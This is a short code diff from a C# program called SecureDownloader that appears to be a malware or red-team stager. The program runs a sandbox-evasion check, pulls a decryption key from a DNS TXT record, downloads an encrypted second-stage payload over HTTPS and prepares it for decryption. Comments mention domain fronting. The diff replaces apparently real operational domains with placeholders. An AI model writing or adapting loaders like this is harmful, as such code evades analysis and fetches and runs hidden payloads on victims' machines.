@@ -190,7 +190,7 @@ namespace SecureDownloader {
         static void Main() {
             SandboxCheck.izSafe();
 
-            byte[] key = Encoding.ASCII.GetBytes(HelperFunctions.getTXTrecords("fda7hk2.concordiafunds.com")[0]);
+            byte[] key = Encoding.ASCII.GetBytes(HelperFunctions.getTXTrecords("keydomain.com")[0]);
             //string data;
             //var version = Environment.Version;
             //if (version.Major >= 4) //domain fronting requires .NET 4.0 or higher
@@ -203,7 +203,7 @@ namespace SecureDownloader {
             //}
             //Environment.Exit(0);
 
-            string data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/data-nf2");
+            string data = HelperFunctions.HttpGet("https://secondstage");
 
             byte[] iv = Convert.FromBase64String(data.Split(':')[0]);
             byte[] encryptedCmd = Convert.FromBase64String(data.Split(':')[1]);
